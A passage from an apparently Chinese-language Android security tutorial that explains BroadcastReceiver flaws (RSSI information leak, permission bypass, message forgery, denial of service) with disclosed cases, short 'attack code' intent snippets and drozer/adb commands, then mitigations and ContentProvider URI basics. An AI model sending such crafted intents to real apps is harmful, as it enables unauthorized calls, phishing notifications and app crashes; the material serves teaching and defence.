class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class="line">        String pwd=intent.getStringExtra(<span class="string">&quot;connected&quot;</span>);</span><br><span class="line">        s=<span class="string">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class="string">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeTest(context,String.format(<span class="string">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>案例二：<a href="https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/">Android 操作系统中通过 RSSI 广播暴露敏感数据 （CVE-2018-9581)</a></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Android操作系统会定期在系统范围内广播WiFI强度值（RSSI）,RSSI值表示设备接收到的信号</span><br><span class="line">的相对强度（更高=更强），但与实际物理强度dBm没有直接关系，这是通过两个独立的intents实现的，Android <span class="number">9</span>之前是android.net.wifi.STATE_CHANGE，其他安卓设备是android.net.wifi.RSSI_CHANGED</span><br><span class="line">    当应用通过WifiManager访问信息时，正常就在应用manifest中请求ACCESS_WIFI_STATE权限。因为<span class="built_in">WiFi</span> RTT特征是Android <span class="number">9</span>中新引入的，也是用于位置定位的，需要ACCESS_FINE_LOCATION权限。但监听系统广播时，</span><br><span class="line">在不需要通知用户，不需要其他权限的情况下就可以获取信息</span><br><span class="line">    存在的安全问题：</span><br><span class="line">    （<span class="number">1</span>）RSSI值是通过广播获取的，绕过的正常的权限检查（ACCESS_WIFI_STATE）</span><br><span class="line">    （<span class="number">2</span>）通过广播或WiFimanager获取的RSSI值可以在不需要其他位置权限的情况下进行室内定制</span><br></pre></td></tr></table></figure><p>攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle state)</span> &#123;</span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();       </span><br><span class="line">    filter.addAction(android.net.wifi.STATE_CHANGE);</span><br><span class="line">    filter.addAction(android.net.wifi.RSSI_CHANGED);</span><br><span class="line">    registerReceiver(receiver, filter);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">BroadcastReceiver</span> <span class="variable">receiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Log.d(intent.toString());</span><br><span class="line">    ….</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="权限绕过">权限绕过</h4><p><strong>原理介绍</strong></p><p>动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</p><p>案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html">小米MIUI漏洞可能导致硬件资源消耗</a></p><p><strong>漏洞详情</strong></p><p>MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒，利用这个漏洞，可以导致系统电源迅速消耗</p><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;</span>);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html">酷派最安全手机s6拨打电话权限绕过</a></p><p>漏洞详情：</p><p>酷派最安全手机s6拨打电话权限绕过，第三方app可以无需拨打电话权限直接拨打电话</p><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;com.android.phone&quot;</span>,<span class="string">&quot;com.android.phone.PhoneGlobals$NotificationBroadcastReceiver&quot;</span>));</span><br><span class="line">intent.setAction(<span class="string">&quot;com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;tel:10000&quot;</span>));</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html">酷派最安全手机s6程序锁绕过</a></p><p>漏洞详情：</p><p>程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的</p><p><strong>漏洞测试</strong></p><p>用adb shell 发送广播，用来解锁</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.PACKAGE_FULLY_REMOVED</span> -d package:com<span class="selector-class">.wumii</span><span class="selector-class">.android</span>.mimi</span><br></pre></td></tr></table></figure><h4 id="消息伪造-2">消息伪造</h4><p><strong>漏洞原理</strong></p><p>暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患</p><p><strong>漏洞复现</strong></p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html">百度云盘手机版钓鱼、信息泄露和代码执行高危漏洞三合一</a></p><p><strong>漏洞描述</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行钓鱼欺骗，盗取用户隐私文件和信息，以百度云盘APP权限执行任何代码。百度云盘有一个广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码。</span><br><span class="line">存在漏洞的组件是：com<span class="selector-class">.baidu</span><span class="selector-class">.android</span><span class="selector-class">.pushservice</span><span class="selector-class">.action</span>.MESSAGE</span><br></pre></td></tr></table></figure><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"> i.setAction(<span class="string">&quot;com.baidu.android.pushservice.action.MESSAGE&quot;</span>)；</span><br><span class="line"> <span class="type">Bundle</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">jsobject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"><span class="comment">//1. phishing</span></span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">custom_content_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">     jsobject.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;百度云盘【漏洞你中奖了！】&quot;</span>);</span><br><span class="line">     jsobject.put(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">     <span class="comment">//jsobject.put(&quot;url&quot;, &quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);</span></span><br><span class="line">     jsobject.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://drops.wooyun.org/webview.html&quot;</span>);</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">customcontent_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();          </span><br><span class="line">     customcontent_js.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;msg_type&quot;</span>, <span class="string">&quot;resources_push&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;uk&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;shareId&quot;</span>, <span class="string">&quot;1&quot;</span>);     </span><br><span class="line">     jsobject.put(<span class="string">&quot;custom_content&quot;</span>, customcontent_js);      </span><br><span class="line">     <span class="type">String</span> <span class="variable">cmd</span>  <span class="operator">=</span> jsobject.toString();</span><br><span class="line">     b.putByteArray(<span class="string">&quot;message&quot;</span>, cmd.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">     e.printStackTrace();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="拒绝服务">拒绝服务</h4><p><strong>漏洞介绍</strong></p><p>如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。<br>拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</p><p><strong>漏洞复现</strong></p><p>案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html">QQ手机管家拒绝服务漏洞</a></p><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componetName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(  <span class="string">&quot;com.tencent.qqpimsecure&quot;</span>,  <span class="string">&quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;</span>);        </span><br><span class="line">i.setComponent(componetName);      </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure><p>案例2：fourgoats.apk拒绝服务攻击崩溃</p><p>我们首先用drozer测试可导出组件</p><p><code>run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</code></p><p><img src="assets/image-20240922203759422.png" alt="image-20240922203759422"></p><p>找到导出的组件</p><p>我们根据组件的类名找对对应的源码信息，发现需要两个参数 phoneNumber、message：</p><p>我们发送恶意广播：格式如下</p><p><code>run app.broadcast.send --action action --extra string name lisi</code></p><p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message dog</code></p><p>我们再向广播组件发送不完整intent，使用空 extras，可以看到应用停止运行：</p><p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</code></p><h3 id="安全防护">安全防护</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）私有广播接收器设置<span class="attribute">exported</span>=’false’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</span><br><span class="line">（2）对接收来的广播进行验证。</span><br><span class="line">（3）内部app之间的广播使用<span class="attribute">protectionLevel</span>=’signature’ 验证其是否真是内部app。</span><br><span class="line">（4）返回结果时需注意接收app是否会泄露信息。</span><br><span class="line">（5）发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</span><br><span class="line">（6）使用LocalBroadcastManager。</span><br></pre></td></tr></table></figure><h2 id="Content-Provider组件相关漏洞">Content Provider组件相关漏洞</h2><p>我们创建一个Content Provider，其他应用通过<strong>ContentResolver</strong>来访问提供的数据，而<strong>ContentResolver</strong>通过uri来定位自己要访问的数据</p><h3 id="uri介绍">uri介绍</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）定义：Uniform Resource Identifier，即统一资源标识符</span><br><span class="line">（<span class="number">2</span>）作用：唯一标识ContentProvider <span class="meta">&amp;其中的数据</span></span><br><span class="line">（<span class="number">3</span>）外界进程通过URL找到对应的ContentProvider <span class="meta">&amp;其中数据，再进行数据操作</span></span><br></pre></td></tr></table></figure><p><strong>自定义URI</strong></p><p><img src="assets/905443_92EXMEKYH5VR3J2.png" alt="image-20210922094010216"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）标准前缀<span class="symbol">:content</span><span class="symbol">://</span> ,用来说明一个<span class="title class_">Content</span> <span class="title class_">Provider</span>控制这些数据</span><br><span class="line">（<span class="number">2</span>）<span class="variable constant_">URL</span>的标识：com.carson.provider, 用于唯一标识这个<span class="title class_">ContentProvider</span>，外部调用者可以根据这个标识来找到它。对于第三方程序，为了保证<span class="variable constant_">URL</span>标识的一致性，必须是一个完整的、小写的类名，这个标识在元素的authorities属性中说明，一般是定义该<span class="title class_">ContentProvider</span>的包.类的名称</span><br><span class="line">（<span class="number">3</span>）路径：<span class="title class_">User</span>,要操作的数据库中表的名字，或者可以自己定义，记得在使用的时候保持一致</span><br><span class="line">（<span class="number">4</span>）记录<span class="variable constant_">ID</span><span class="symbol">:id</span>, 如果<span class="variable constant_">URL</span>中包含表示需要获取的记录<span class="variable constant_">ID</span>,则返回该id对应的数据，如果没有<span class="variable constant_">ID</span>,就表示返回全部</span><br></pre></td></tr></table></figure><p>若要将一个字符串转换成URI，可以使用parse</p><p><code>Uri uri </code>=<code> </code>Uri.parse(<code>&quot;content://com.carson.provider/User&quot;</code>)；</p><p><strong>给出一个URI示例</strong></p><p><code>http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&amp;name=jack</code></p><p>获得URI的各个部分：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getScheme</span><span class="params">()</span></span>：获取 Uri 中的 scheme 字符串部分，在这里是 http</span><br><span class="line"><span class="function"><span class="title">getHost</span><span class="params">()</span></span>：获取 Authority 中的 Host 字符串，即 www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br><span class="line"><span class="function"><span class="title">getPost</span><span class="params">()</span></span>：获取 Authority 中的 Port 字符串，即 <span class="number">8080</span></span><br><span class="line"><span class="function"><span class="title">getPath</span><span class="params">()</span></span>：获取 Uri 中 <span class="selector-tag">path</span> 部分，即 wenku/jiatiao<span class="selector-class">.html</span></span><br><span class="line"><span class="function"><span class="title">getQuery</span><span class="params">()</span></span>：获取 Uri 中的 query 部分，即 id=<span class="number">15</span>&amp;name=jack</span><br><span class="line"><span class="function"><span class="title">getSchemeSpecificPart</span><span class="params">()</span></span>：域名+端口号+路径+参数</span><br><span class="line">getAuthority：获取用户信息+域名+端口号</span><br><span class="line">getUserInfo：获取用户信息数据</span><br></pre></td></tr></table></figure><p><strong>MIME</strong></p><p><a href="https://blog.csdn.net/ldld1717/article/details/52180017">https://blog.csdn.net/ldld1717/article/details/52180017</a></p><p>MIME是指定某一个拓展名的文件用那一种应用程序打开</p><p>就像用浏览器查看PDF格式的文件，浏览器会选择合适的应用打开。ContentProvider 会根据 URI 来返回 MIME 类型，ContentProvider 会返回一个包含两部分的字符串。MIME 类型一般包含两部分，如：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>/html</span><br><span class="line"><span class="built_in">text</span>/css</span><br><span class="line"><span class="built_in">text</span>/xml</span><br><span class="line"><span class="built_in">application</span>/pdf</span><br></pre></td></tr></table></figure><p>分为类型和子类型，Android 遵循类似的约定来定义MIME类型，每个内容类型的 Android MIME 类型有两种形式：多条记录（集合）和单条记录。</p><ul><li><p>集合记录(dir):<br>vnd.android.cursor.<code>dir</code>/``自定义</p></li><li><p>单条记录(item)：</p><p>vnd.android.cursor.item/自定义</p></li></ul><p>vnd 表示这些类型和子类型具有非标准的、供应商特定的形式。Android中类型已经固定好了，不能更改，只能区别是集合还是单条具体记录，子类型可以按照格式自己填写，在使用 Intent 时，会用到 MIME，根据 Mimetype 打开符合条件的活动。</p><h3 id="URI解析">URI解析</h3><p>这里URI代表要操作的数据，我们在对数据进行获取时需要解析URI，Android提供了两个操作URI的工具类：<strong>UriMatcher</strong> 和 <strong>ContentUris</strong></p><p><strong>UriMatcher</strong></p><ul><li>将需要匹配的Uri路径进行注册</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//常量UriMatcher.NO_MATCH表示不匹配任何路径的返回码</span></span><br><span class="line"><span class="type">UriMatcher</span>  <span class="variable">sMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class="line"><span class="comment">//如果match()方法匹配“content://com.wang.provider.myprovider/tablename”路径，返回匹配码为1</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;content://com.wang.provider.myprovider&quot;</span>, <span class="string">&quot; tablename &quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//如果match()方法匹配content://com.wang.provider.myprovider/tablename/11路径，返回匹配码为2</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;com.wang.provider.myprovider&quot;</span>, <span class="string">&quot;tablename/#&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>此处采用 addURI 注册了两个需要用到的 URI；注意，添加第二个 URI 时，路径后面的 id 采用了通配符形式 “#”，表示只要前面部分都匹配上了就 OK</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*:表示匹配任意长度的任意字符</span><br><span class="line"><span class="comment">#:表示匹配任意长度的数字</span></span><br><span class="line">匹配任意表的内容URI格式：</span><br><span class="line">content：<span class="regexp">//</span>com.example.app.provider/*</span><br><span class="line">匹配table表中<span class="number">1</span>任意一行数据的内容URI格式：</span><br><span class="line">content：<span class="regexp">//</span>com.example.app.procider<span class="regexp">/table/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><ul><li>注册完需要匹配的 Uri 后，可以使用 sMatcher.match(Uri) 方法对输入的 Uri 进行匹配，如果匹配就返回对应的匹配码，匹配码为调用 addURI() 方法时传入的第三个参数<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (sMatcher.match(Uri.parse(<span class="string">&quot;content://com.zhang.provider.yourprovider/tablename/100&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="comment">//match 1, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span></span><br><span class="line">      <span class="comment">//match 2, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//match nothing, todo something</span></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>ContentUris</strong></p><p>ContentUris类用于操作Uri路径后面的ID部分，有两个常用方法：</p><p>withAppendedId(Uri uri, long id)和parseId(Uri uri)</p><ul><li><p>withAppendedId(Uri uri, long id)用于为路径加上ID部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"><span class="comment">//生成的Uri为：content://com.wang.provider.myprovider/tablename/10</span></span><br><span class="line"> <span class="type">Uri</span> <span class="variable">resultUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">10</span>);</span><br></pre></td></tr></table></figure></li><li><p>parseId(Uri uri)则从路径中获取ID部分:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.zhang.provider.myprovider/tablename/10&quot;</span>)</span><br><span class="line"><span class="comment">//获取的结果为：10</span></span><br><span class="line"><span class="type">long</span> <span class="variable">personid</span> <span class="operator">=</span> ContentUris.parseId(uri);</span><br></pre></td></tr></table></figure></li></ul><h3 id="ContentProvider操作数据">ContentProvider操作数据</h3><p>当外部应用需要对ContentProvider中的数据进行添加、删除、修改及查询操作时，可以使用ContentResolver类来完成，要获取ContentResolver对象，可以使用Activity提供getContentResolver()</p><p>ContentResolver类提供了与ContentProvider类相同签名的四个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>，往ContentProvider添加数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>，从ContentProvider删除数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，更新ContentProvider中的数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，从ContentProvider中获取数据；</span><br></pre></td></tr></table></figure><p>使用ContentResolver对ContentProvider中的数据进行操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"> <span class="comment">//添加一条记录</span></span><br><span class="line"> <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line"> values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;wang1&quot;</span>);</span><br><span class="line"> values.put(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line"> resolver.insert(uri, values);</span><br><span class="line"> <span class="comment">//获取tablename表中所有记录</span></span><br><span class="line"> <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> resolver.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;tablename data&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">   Log.i(<span class="string">&quot;ContentTest&quot;</span>, <span class="string">&quot;tablename_id=&quot;</span>+ cursor.getInt(<span class="number">0</span>)+ <span class="string">&quot;, name=&quot;</span>+ cursor.getString(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//把id为2的记录的name字段值更改新为zhang1</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">updateValues</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">updateValues.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhang1&quot;</span>);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">updateIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.update(updateIdUri, updateValues, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//删除id为2的记录，即字段age</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">deleteIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.delete(deleteIdUri, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h3 id="监听数据变化">监听数据变化</h3><p>如果ContentProvider的访问者需要知道数据发生的变化，可以在ContentProvider发生数据变化时调用getContentResolver().notifyChange(uri, null)来通知注册在此URI上的访问者。只给出类中监听部分的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span> &#123;</span><br><span class="line">     db.insert(<span class="string">&quot;tablename&quot;</span>, <span class="string">&quot;tablenameid&quot;</span>, values);</span><br><span class="line">      getContext().getContentResolver().notifyChange(uri, <span class="literal">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而访问者必须使用ContentObserver对数据（数据采用uri描述）进行监听，当监听到数据变化通知时，系统就会调用ContentObserver的onChange()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 